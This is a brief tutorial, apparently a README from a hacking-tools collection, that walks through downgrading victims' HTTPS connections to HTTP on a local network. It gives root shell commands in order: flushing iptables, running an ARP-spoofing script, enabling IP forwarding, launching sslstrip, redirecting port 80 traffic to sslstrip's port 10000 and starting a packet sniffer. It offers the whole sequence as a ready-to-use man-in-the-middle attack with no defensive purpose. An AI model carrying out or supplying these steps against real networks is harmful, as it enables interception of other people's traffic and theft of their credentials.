# DOWNGRADING HTTPS TO HTTP


To downgrade the **https** to **http** you can use a tool **sslstrip** developed by **moxie0** you can see the offial [Github](https://github.com/moxie0/sslstrip) repo for more details and download it.


## RUN:

1. First flush the iptables

```
root@kali:~# iptables --flush

```

2. Use the **arp_spoofer** tool to do the attack :

```
root@kali:~# python arp_spoof.py

```

3. Enable the port forwarding to act as a router

```
root@kali:~# iptables --flush
root@kali:~# echo "1" > /proc/sys/net/ipv4/ip_forward


```

3. Run the sslstrip :

```
root@kali:~# sslstrip

```

4. Since sslstrip runs the port bydefault **10000** and we recives packets on **80** we need to forward it **10000**

```
root@kali:~# iptables --flush
root@kali:~# echo "1" > /proc/sys/net/ipv4/ip_forward
root@kali:~# iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000

```

5. Now once sslstrip is set up, now you can use the **packet_sniffer** to sniff the packets.

```
root@kali:~# python packet_sniffer.py

```
